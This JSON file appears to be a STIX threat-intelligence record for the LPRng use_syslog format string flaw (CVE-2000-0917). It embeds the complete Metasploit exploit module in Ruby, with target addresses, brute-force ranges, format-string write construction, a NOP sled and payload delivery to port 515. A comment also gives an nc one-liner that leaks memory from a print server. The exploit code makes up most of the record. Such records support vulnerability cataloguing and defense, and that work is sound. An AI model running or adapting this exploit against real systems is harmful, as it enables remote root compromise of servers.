{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e51e6b5a-1e0c-4042-9811-714e97473d16",
    "created": "2024-08-14T16:57:39.970607Z",
    "modified": "2024-08-14T16:57:39.970611Z",
    "name": "LPRng use_syslog Remote Format String Vulnerability",
    "description": " This module exploits a format string vulnerability in the LPRng print server. This vulnerability was discovered by Chris Evans. There was a publicly circulating worm targeting this vulnerability, which prompted RedHat to pull their 7.0 release. They consequently re-released it as \"7.0-respin\". ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/misc/lprng_format_string.rb",
            "external_id": "lprng_format_string.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2000-0917"
        },
        {
            "source_name": "reference",
            "url": "http://www.cert.org/advisories/CA-2000-22.html"
        },
        {
            "source_name": "reference",
            "url": "https://bugzilla.redhat.com/show_bug.cgi?id=17756"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Exploit::Brute\n  include Msf::Exploit::FormatString\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'LPRng use_syslog Remote Format String Vulnerability',\n      'Description'    => %q{\n          This module exploits a format string vulnerability in the LPRng print server.\n        This vulnerability was discovered by Chris Evans. There was a publicly\n        circulating worm targeting this vulnerability, which prompted RedHat to pull\n        their 7.0 release. They consequently re-released it as \"7.0-respin\".\n      },\n      'Author'         => [ 'jduck' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2000-0917' ],\n          [ 'OSVDB', '421' ],\n          [ 'BID', '1712' ],\n          [ 'US-CERT-VU', '382365' ],\n          [ 'URL', 'http://www.cert.org/advisories/CA-2000-22.html' ],\n          [ 'URL', 'https://bugzilla.redhat.com/show_bug.cgi?id=17756' ],\n          [ 'EDB', '226' ],\n          [ 'EDB', '227' ],\n          [ 'EDB', '230' ]\n        ],\n      'Platform'       => 'linux',\n      'Arch'           => ARCH_X86,\n      'Privileged'     => true, # root\n      'DefaultOptions' =>\n        {\n          'PrependSetresuid' => true\n        },\n      'Payload'        =>\n        {\n          'Space'    => 130, # buffer size on caldera is 180! (need ~50 for fmt)\n          'BadChars' => \"\\x00\\x0a\\x20\\x25\",\n        },\n      'Targets'        =>\n        [\n          # tested OK - jjd\n          [ 'Caldera OpenLinux 2.3 Bruteforce',\n            {\n              'Platform'   => 'linux',\n              'NumPops'    => 243,\n              'FlowHook'   => 0x80992d4,  # GOT of exit\n              # (0x809c180+(41+4+10+48)) - data segment, but gets corrupted\n              'Bruteforce' =>\n                {\n                  'Start' => { 'Ret' => 0xcffffff4 },\n                  'Stop'  => { 'Ret' => 0x7fffe004 },\n                  'Step'  => 16\n                }\n            }\n          ],\n=begin\n          # untested (from public exploits)\n          [ 'Slackware 7.0 LPRng-3.6.22.tgz - started from shell',\n            {\n              'NumPops' \t=> 299,\n              'Ret' \t   => 0xbffff640,\n              'FlowHook'\t=> 0xbfffee30\n            }\n          ],\n          [ 'RedHat 7.0 (Guinness) with LPRng-3.6.22/23/24-1 from rpm - glibc-2.2-5',\n            {\n              'NumPops' \t=> 304,\n              'Ret' \t   => 0xbffff920,\n              'FlowHook'\t=> 0xbffff0f0\n            }\n          ],\n          [ 'RedHat 7.0 - Guinesss',\n            {\n              'NumPops' \t=> 300,\n              'Ret' \t   => 0x41424344,\n              'FlowHook'\t=> 0xbffff3ec\n            }\n          ],\n          [ 'RedHat 7.0 - Guinesss-dev',\n            {\n              'NumPops' \t=> 300,\n              'Ret' \t   => 0x41424344,\n              'FlowHook'\t=> 0xbffff12c\n            }\n          ],\n=end\n          # ...\n          [ 'Debug',\n            {\n              'NumPops' \t=> 1, # sure to miss.\n              'Ret' \t   => 0x41424344,\n              'FlowHook'\t=> 0x45464748\n            }\n          ]\n        ],\n      # 'DefaultTarget' => 0,\n      'DisclosureDate' => '2000-09-25'))\n\n    register_options( [ Opt::RPORT(515) ])\n  end\n\n\n  def exploit\n    # we want to use DPA for this one :)\n    fmtstr_set_caps(false, true)\n\n    # check syslog to see which number hits 41414141\n=begin\n    400.times { |x|\n      connect\n      buf = \"aAAAABBBB|%%%u$x|%u\\n\" % [x+1, x+1]\n      sock.put(buf)\n      #handler\n      disconnect\n    }\n=end\n    print_status(\"Trying target #{target.name} ..\")\n\n    super\n  end\n\n\n  def brute_exploit(addrs)\n\n    #print_status(\"Trying target #{target.name} - addr 0x%x...\" % addrs['Ret'])\n\n    printed = \"Service_connection: bad request line '\\\\35\" # + \"'XXXYYYYZZZZ...\n    num_start = printed.length + 2 + 4\n\n    # write 'ret' addr to flowhook (execute shellcode)\n    # NOTE: the resulting two writes must be done at the same time\n\n    # characters (chr(10) > X > chr(99)) will screw up alignment (\\XXX in syslog)\n    fmtbuf = \"_\" * 4\n    fmtbuf << generate_fmt_two_shorts(num_start, target['FlowHook'], addrs['Ret'])\n    #print_status(\" hijacker format string buffer is #{fmtbuf.length} bytes\")\n\n    # append payload and newline\n    #fmtbuf << payload.encoded\n    fmtbuf << \"\\x90\" * 32\n    fmtbuf << Rex::Text.charset_exclude(payload_badchars)\n    fmtbuf << \"\\n\"\n\n    print_status(\" writing 0x%x to 0x%x\" % [addrs['Ret'], target['FlowHook']])\n\n    connect\n    #print_status(\"Sleeping, attach now!!\")\n    #select(nil,nil,nil,5)\n\n    sock.put(fmtbuf)\n\n    handler\n    disconnect\n\n  end\nend\n\n\n=begin\n\nHRM!\n\nThe following causes info leakage!\n\nbash$ ( ruby -e 'puts \"\\x09\" + (\"%x\" * 50) + \"\\n\"'; cat) | nc 192.168.0.120 515 | hexdump -vC\n\nThere are various other ways to trigger the vulnerability. LPD uses the single-byte commands\n0x01 -> 0x09...\n\nIt's unclear if there is a way to auto-detect the lpd version via LPD commands.\n\n=end\n",
    "x_mitre_disclosure_date": "2000-09-25",
    "x_mitre_platforms": [
        "linux'"
    ]
}